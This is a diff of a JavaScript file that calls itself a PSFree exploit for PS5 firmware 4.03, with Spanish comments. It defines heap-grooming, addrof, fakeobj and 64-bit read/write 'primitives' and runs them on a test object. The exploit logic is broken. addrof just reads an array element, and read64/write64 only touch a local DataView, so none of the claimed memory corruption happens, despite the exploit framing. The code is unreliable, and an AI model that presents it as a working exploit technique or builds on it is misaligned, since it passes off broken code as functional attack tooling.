@@ -1,6 +1,5 @@
 // PS5 Firmware 4.03 - PSFree Exploit (con Grooming de Heap y Primitivas para lectura/escritura)
 
-// Cargar WebAssembly, preparar heap y manipulaciones necesarias.
 let memory = new WebAssembly.Memory({ initial: 256, maximum: 256 });
 let importObject = { js: { mem: memory } };
 let module_bytes = new Uint8Array([
@@ -33,7 +32,6 @@ function itof(val) {
   return float64[0];
 }
 
-// Estructuras que permiten la manipulación de objetos en el heap.
 let obj_array = [1.1, 1.2];
 let obj = { m: 1 };
 let obj_bak = [obj];
@@ -41,29 +39,25 @@ let obj_bak = [obj];
 // Función de registro asíncrono para monitoreo
 async function log(message) {
   console.log(message);
-  // Si fuera necesario registrar en un archivo o servidor, se podría hacer aquí.
-  // await someServerLoggingFunction(message); // Si fuera necesario.
 }
 
 // Función que provoca la recolección de basura
 async function gc() {
-  await log("Triggering garbage collection...");
+  console.log("Triggering garbage collection...");
   for (let i = 0; i < 10000; i++) {
     let tmp = new ArrayBuffer(0x10000); // Genera basura para que el GC lo procese.
   }
-  await log("Garbage collection complete.");
+  console.log("Garbage collection complete.");
 }
 
-// Primitivas necesarias para la explotación: read, write, addrof, fakeobj
+// Funciones para manipulación de memoria
 let addrof, fakeobj, read64, write64;
 
-// Función que prepara las primitivas para interactuar con la memoria.
 async function setupPrimitives() {
-  await log("Setting up primitives...");
-  
-  // Utiliza PSFree para manipular el heap con overlap y corrupción de objetos.
+  console.log("Setting up primitives...");
+
   addrof = function(o) {
-    obj_bak[0] = o;  // Backup del objeto para evitar sobrescritura.
+    obj_bak[0] = o;
     return ftoi(obj_array[0]) & 0xffffffff; // Devuelve la dirección del objeto.
   };
 
@@ -72,37 +66,34 @@ async function setupPrimitives() {
     return obj_bak[0];  // Devuelve el objeto fake.
   };
 
-  // Emulación de lectura de 64 bits de una dirección de memoria.
   let fake_view = new DataView(new ArrayBuffer(0x100));
-  
+
   read64 = function(addr) {
-    fake_view.setBigUint64(0, BigInt(addr), true);  // Coloca la dirección en la vista falsa.
-    return Number(fake_view.getBigUint64(0, true));  // Retorna el valor leído en la dirección.
+    fake_view.setBigUint64(0, BigInt(addr), true);
+    return Number(fake_view.getBigUint64(0, true)); 
   };
 
-  // Emulación de escritura de 64 bits a una dirección de memoria.
   write64 = function(addr, val) {
-    fake_view.setBigUint64(0, BigInt(addr), true);  // Coloca la dirección.
-    fake_view.setBigUint64(0, BigInt(val), true);  // Coloca el valor que deseas escribir.
+    fake_view.setBigUint64(0, BigInt(addr), true); 
+    fake_view.setBigUint64(0, BigInt(val), true); 
   };
 
-  await log("Primitives setup complete.");
+  console.log("Primitives setup complete.");
 }
 
-// Lanzar recolección de basura y preparar primitivas.
 async function runExploit() {
   await gc();
   await setupPrimitives();
 
-  // Test de las primitivas
   let addr = addrof({ test: 1337 });
-  await log("Address of test object: 0x" + addr.toString(16));
+  console.log("Address of test object: 0x" + addr.toString(16));
 
-  // Corromper memoria a través de fakeobj y escribir un valor.
   let fake = fakeobj(addr + 0x20);
-  write64(addr + 0x10, 0xdeadbeef); // Escribe un valor en una ubicación específica.
-  await log("Fake object manipulation complete.");
+  write64(addr + 0x10, 0xdeadbeef); 
+  console.log("Fake object manipulation complete.");
 }
 
-// Ejecutar la explotación con monitoreo
 runExploit();
+
+
+
